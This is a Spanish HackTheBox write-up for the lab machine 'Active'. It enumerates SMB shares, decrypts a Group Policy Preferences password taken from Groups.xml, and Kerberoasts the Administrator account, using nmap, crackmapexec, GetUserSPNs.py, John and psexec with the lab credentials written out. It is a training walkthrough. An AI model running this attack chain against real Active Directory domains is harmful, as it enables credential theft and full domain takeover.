---
layout: default
title: Active
parent: HackTheBox
grand_parent: Writeups
---

# Active
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

Tenemos el puerto del SMB abierto donde descubriremos el archivo **Groups.xml** con una contraseña referente a **Group Policy Preferences(GPP)** que nos permitira conectarnos por SMB con las credenciales y leer la flag de user, para la escalada de privilegios haremos un **Kerberoasting**.

{:.lead}


## Enumeracion

Iniciamos con un escaneo de nmap con:

```ruby
nmap -sS -n -Pn -T4 --open -p- 10.10.10.100
```

- sS: haga un TCP SYN Scan el cual hace un escaneo sigiloso sin completar las conexiones TCP, responde con un SYN/ACK si esta abierto

- n: para que no haga resolucion DNS y tarde menos el escaneo

- Pn: para evitar el descubrimiento de hosts

- open: para que solo muestre los puertos abiertos

- -p-: para que escanee todo el rango de puertos

Y nos reporto que hay varios puertos abiertos:

```ruby
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5722/tcp  open  msdfsr
9389/tcp  open  adws
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49165/tcp open  unknown
49170/tcp open  unknown
49171/tcp open  unknown
```

Los de interes podrian ser:

- **53**: DNS
- **88**: Protocolo de autenticacion Kerberos
- **135**: Microsoft Remote Procedure Call (MSRPC), el **ms** de su nombre es por Microsoft, y RPC es **Remote Procedure Call**
- **139/445**: NetBIOS-SSN/Microsoft-DS, y SMB y NetBIOS
- **389, 636, 3268, 3269**: Corresponde a LDAP, LDAP SSL, Global Catalog LDAP, Global Catalog LDAP SSL
- **464**: Cambio de contraseñas de Kerberos (kpasswd5)

(Les adelanto que no hare un escaneo para buscar por versiones y servicios que estan corriendo por detras de esos puertos por que en este caso no hace falta)

### Enumeracion SMB

De primeras podemos usar **crackmapexec** sobre SMB para obtener informacion inicial sobre el servicio SMB de la maquina:

```ruby
crackmapexec smb 10.10.10.100
```

Y esto nos arroja

```ruby
SMB    10.10.10.100  445  DC    [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
```

Podemos ver que el nombre es **DC** (Domain Controller), el dominio es **active.htb**, la version de windows, y que no se usa **SMBv1**

Para hacer las cosas mas faciles podemos editar el **/etc/hosts** para indicarle que el dominio **active.htb** se resuelva a la IP **10.10.10.100**

Para seguir enumerando podemos usar **crackmapexec**, **smbmap**, **smbclient** o **impacket-smbclient**, en mi caso usare de nuevo **crackmapexec** haciendo uso de null session para enumerar recursos compartidos por SMB:

```ruby
crackmapexec smb active.htb -u '' -p '' --shares
```

Esto nos arroja:

![](/assets/img/active/2.png)

Podemos ver que el unico que no es comun en Windows es el de **Replication**, ademas de que tenemos permisos de lectura, ahora nos conectaremos usando **smbclient** para explorar el directorio:

```ruby
smbclient //active.htb/Replication -N
```

Despues de explorar entre los directorios encontramos un archivo llamado **Groups.xml** en el directorio: **\active.htb\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups**, haciendo uso del comando **get Groups.xml** nos los descargamos

#### Curiosidad

Cuando usamos crackmapexec para enumerar recursos, vimos que estaba uno con el nombre de **SYSVOL**, el cual es un recurso compartido que almacena informacion de la politicas de grupo y scripts de inicio de sesion, al recurso **SYSVOL** se le pueden hacer replicaciones por medio de **DFSR** o **FRS** (esto depende de la version de Windows server), esto es interesante por que la estructura del recurso **Replication** es similar a la de **SYSVOL**, asi que es posible que se haya hecho una replicacion y por eso mismo encontramos el archivo **Groups.xml** en ese directorio

### Crackeando credenciales de GPP

Si vemos el contenido del archivo

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
    <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">
        <Properties action="U" 
            newName="" 
            fullName="" 
            description="" 
            cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
            changeLogon="0" 
            noChange="1" 
            neverExpires="1" 
            acctDisabled="0" 
            userName="active.htb\SVC_TGS"/>
    </User>
</Groups>
```

Nos podemos dar cuenta que tenemos el hash de una contraseña para el usuario **SVC_TGS**, el ser una contraseña que se almacena en el archivo **Groups.xml** entonces es una contraseña de **preferencias de política de grupo (GPP)**, podemos usar **gpp-decrypt** con el comando:

```ruby
python3 gpp-decrypt.py -f groups.xml
```

Y la contraseña es: **GPPstillStandingStrong2k18**

Ahora podemos usar **crackmapexec** para validarla

```ruby
crackmapexec smb active.htb -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
```

- **u**: Indica el usuario
- **p**: Indica la contraseña

Si aparace un **+** es que son credenciales validas

![](/assets/img/active/3.png)

Simon, ta buena

Ahora haciendo uso de nuevo de **crackmapexec**  para enumerar recursos pero ahora usando credenciales validas

```ruby
crackmapexec smb active.htb -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares
```

![](/assets/img/active/4.png)

Nos podemos dar cuenta que tenemos permisos de lectura en varios directorios, en esta caso el que nos interesa es el de **Users**, usaremos **smbclient** para conectarnos

```ruby
smbclient //active.htb/Users -U SVC_TGS%GPPstillStandingStrong2k18
```

Explorando un poco encontramos en el directorio **\active.htb\Users\SVC_TGS\Desktop** la flag de user

## Escalada de privilegios (Kerberoasting)

Como estamos en un Active Directory se esta usando Kerberos podemos probar una tecnica llamada **Kerberoasting**, con la que en este caso podemos obtener las credenciales del usuario **Administrador**

### Breve explicacion

Kerberoasting es una tecnica que se aprovecha de Kerberos con la cual podemos extraer hashes validos de cuentas de servicio, este ataque funciona solicitando tickets TGS para todos los usuarios que esten disponibles en el dominio, para despues intentar cracker estos tickets de manera offline y obtener las contraseñas.

Kerberoasting se aprovecha de la obtencion de **TGS**, es decir, cuando un usuario intenta acceder a un servicio, se entrega su **TGT** al **KDC** con una solicitud de un ticket para ese servicio, entonces el **KDC** verifica si el **TGT** es valido, y si lo es, le entrega un ticket de servicio, los **TGS** están cifrados con la contraseña del servicio que fue solicitado, entonces si nosotros comprometemos a un usuario valido, podemos solicitar los demas **TGS** de los usuarios que tengan un **SPN** en un Domain Controller, y si la contraseña de los **TGS** es débil, la podemos crackear de forma offline

En este caso como ya comprometimos el usuario **SVC_TGS** y evidetemente tenemos unas credenciales validas y nos dan una entrada al dominio, entonces podemos empezar por ahi, ahora usaremos **GetUserSPNs.py** para solicitar los **TGS** de los usuarios con un **SPN**:

```ruby
GetUserSPNs.py 'active.htb/SVC_TGS:GPPstillStandingStrong2k18' -request
```

- El **-request** se usa para solicitar los TGS de los SPN

![](/assets/img/active/5.png)

Y obtivimos un **TGS** para el **SPN** **active/CIFS:445** el cual es del usuario **Administrator**

Ahora lo crackeamos de forma offline con John:

```
john --wordlist=/usr/share/wordlist/rockyou.txt hash
```

Y obtenemos su contraseña: **Ticketmaster1968**

Ahora la validamos con **crackmapexec** y si sale un **Pwned!** es por que tenemos control total de esa cuenta y privilegios maximos

```ruby
crackmapexec smb active.htb -u Administrator -p Ticketmaster1968
```

![](/assets/img/active/6.png)

Y por ultimo podemos usar **psexec** para acceder a la maquina con las credenciales de **Administrator**

```ruby
psexec.py active.htb/Administrator:Ticketmaster1968@active.htb 
```

![](/assets/img/active/7.png)

Solo leemos la flag de root en **C:\Users\Administrator\Desktop\root.txt** y ya estufas

Eso ha sido todo, gracias por leer ❤